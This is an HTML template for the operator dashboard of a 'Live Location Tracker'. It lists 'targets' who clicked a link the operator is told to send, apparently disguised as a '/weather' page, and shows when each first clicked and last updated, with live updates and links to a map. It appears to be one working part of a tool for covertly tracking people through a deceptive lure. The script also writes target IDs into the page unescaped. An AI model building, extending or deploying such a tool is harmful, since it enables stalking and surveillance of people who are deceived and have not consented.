<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
</head>

<body>
    <header class="has-background-black p-3 has-text-centered">
        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
        <a href="https://www.linkedin.com/in/arya-bandhu/" class="is-block mb-2">by ProGem</a>
        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
    </header>

    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
        <h1 class="title is-5">Targets</h1>

        {{ for(value, key in TARGETS) }}
        <a data-target-id="{{ key }}" href="/map?id={{ key }}" class="button is-fullwidth is-flex is-flex-direction-column">
            <strong>{{ key }}</strong>
            <small>First clicked: <span class="first-seen">{{ value.firstSeen }}</span> | Last update: <span class="last-seen">{{ value.lastSeen }}</span></small>
        </a>
        {{/}}
    </section>

    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
    <script>
        const content = document.querySelector("#tar-content")
        const socket = io("", {
            secure: true,
            path: "/socket.io",
            transports: ['websocket']
        })

        socket.on("user-connected", target => {
            const a = document.createElement('a')
            a.dataset.targetId = target.id
            a.href = `/map?id=${target.id}`
            a.className = "button is-fullwidth is-flex is-flex-direction-column"
            a.innerHTML = `<strong>${target.id}</strong>
                <small>First clicked: <span class="first-seen">${target.firstSeen}</span> |
                Last update: <span class="last-seen">${target.lastSeen}</span></small>`
            content.appendChild(a)
        })

        socket.on("map-data", target => {
            const link = document.querySelector(`[data-target-id="${target.id}"]`)
            if (link == null) return

            const firstSeen = link.querySelector(".first-seen")
            const lastSeen = link.querySelector(".last-seen")
            if (firstSeen != null) firstSeen.innerText = target.firstSeen
            if (lastSeen != null) lastSeen.innerText = target.lastSeen
        })
    </script>
</body>

</html>
